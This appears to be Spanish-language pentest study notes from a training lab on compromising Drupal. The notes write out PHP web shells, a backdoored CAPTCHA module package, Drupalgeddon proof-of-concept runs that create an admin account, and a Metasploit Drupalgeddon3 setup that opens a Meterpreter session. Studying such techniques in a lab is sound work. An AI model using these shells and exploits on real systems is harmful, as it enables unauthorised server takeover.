
## 1. PHP Filter Module

### Drupal 7 y anteriores

Permite ejecutar código PHP dentro del contenido de una página si el módulo `PHP Filter` está habilitado.

**Procedimiento:**

1. Ir a `Administration > Modules`.
    
2. Habilitar `PHP Filter`.
    
3. Ir a `Content > Add Content > Basic Page`.
    
4. Introducir el código PHP.
    
5. Seleccionar `Text format: PHP code`.
    
6. Guardar la página y acceder a su URL.
    

**Web Shell:**

```
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

**Ejecutar comandos:**

```
curl -s "http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id"
```

Resultado esperado:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupal 8 y posteriores

PHP Filter no viene instalado por defecto. Su instalación depende de la versión y de la compatibilidad del módulo.

**Descargar el módulo:**

```
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

## 2. Uploading a Backdoored Module

Si tenemos permisos administrativos para instalar módulos, podemos modificar uno legítimo e introducir un archivo PHP.

### Preparar el módulo

Descargar y extraer CAPTCHA:

```
wget https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

Crear `shell.php`:

```
<?php
system($_GET['fe8edbabc5c5c9b7b764504cd22b17af']);
?>
```

Crear `.htaccess`:

```
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

Mover los archivos y empaquetar el módulo:

```
mv shell.php .htaccess captcha/
tar cvf captcha.tar.gz captcha/
```

### Instalar y ejecutar

1. Acceder al panel administrativo.
    
2. Ir a `Manage > Extend > Install new module`.
    
3. Subir `captcha.tar.gz`.
    

**Acceder a la Web Shell:**

```
curl -s "http://drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

El objetivo es ejecutar comandos como el usuario del servidor web, normalmente `www-data`.

## 3. Drupalgeddon — Vulnerabilidades conocidas

|Vulnerabilidad|CVE|Versiones afectadas según el módulo|Tipo|Autenticación|
|---|---|---|---|---|
|Drupalgeddon|CVE-2014-3704|Drupal 7.0–7.31|SQL Injection|No|
|Drupalgeddon2|CVE-2018-7600|Anteriores a 7.58 y 8.5.1|RCE|No|
|Drupalgeddon3|CVE-2018-7602|Diversas versiones 7.x y 8.x|RCE mediante Form API|Sí|

### 3.1. Drupalgeddon — CVE-2014-3704

Vulnerabilidad de SQL Injection que permite, entre otras acciones, crear usuarios administradores.

**Ejecutar el PoC:**

```
python2.7 drupalgeddon.py \
  -t http://drupal-qa.inlanefreight.local \
  -u hacker \
  -p pwnd
```

Si funciona, el script indica que el objetivo es vulnerable y que ha creado un usuario administrador.

Credenciales del ejemplo:

```
Usuario: hacker
Contraseña: pwnd
```

Una vez obtenido acceso administrativo, se pueden probar los métodos de ejecución PHP descritos anteriormente.

**Metasploit:**

```
use exploit/multi/http/drupal_drupageddon
```

### 3.2. Drupalgeddon2 — CVE-2018-7600

Vulnerabilidad de RCE sin autenticación, relacionada con una validación insuficiente de entradas en formularios.

**Ejecutar el PoC:**

```
python3 drupalgeddon2.py
```

El script permite comprobar la vulnerabilidad mediante la creación de `hello.txt`.

**Verificar:**

```
curl -s http://drupal-dev.inlanefreight.local/hello.txt
```

Resultado esperado:

```
;-)
```

El material muestra también una variante del PoC que escribe un archivo PHP en el servidor para obtener ejecución de comandos.

**Verificar la ejecución:**

```
curl "http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id"
```

Resultado esperado:

```
uid=33(www-data) gid=33(www-data)
```

### 3.3. Drupalgeddon3 — CVE-2018-7602

Vulnerabilidad de RCE autenticada que aprovecha un fallo de validación en Drupal Form API.

**Requisitos:**

- Disponer de una sesión autenticada válida.
    
- Tener permisos para eliminar un nodo.
    
- Identificar un nodo sobre el que operar.
    

**Explotación mediante Metasploit:**

```
msfconsole
```

```
use exploit/multi/http/drupal_drupageddon3

set RHOSTS 10.129.42.195
set VHOST drupal-acc.inlanefreight.local
set DRUPAL_SESSION <COOKIE_DE_SESION>
set DRUPAL_NODE 1
set LHOST 10.10.14.15

show options
exploit
```

Si la explotación tiene éxito, se obtiene una sesión Meterpreter.

**Comprobar el usuario:**

```
getuid
```

Resultado esperado:

```
Server username: www-data (33)
```

**Consultar información del sistema:**

```
sysinfo
```

## 4. Resumen rápido para pentesting

|Escenario|Técnica|
|---|---|
|Drupal 7 con acceso administrativo|PHP Filter|
|Drupal 8 con permisos para instalar módulos|Backdoored Module|
|Drupal 7.0–7.31 vulnerable|Drupalgeddon / SQL Injection|
|Drupal vulnerable a CVE-2018-7600|Drupalgeddon2 / RCE sin autenticación|
|Drupal vulnerable a CVE-2018-7602 y sesión con permisos|Drupalgeddon3 / RCE autenticada|

## 5. Checklist de enumeración

1. Identificar la versión de Drupal.
    
2. Comprobar si tenemos acceso administrativo.
    
3. Revisar los módulos instalados y si PHP Filter está habilitado.
    
4. Comprobar si podemos instalar módulos.
    
5. Comparar la versión detectada con las vulnerabilidades conocidas.
    
6. Seleccionar el vector adecuado según la versión y los permisos disponibles.
    
7. Verificar la ejecución de comandos y el usuario obtenido.
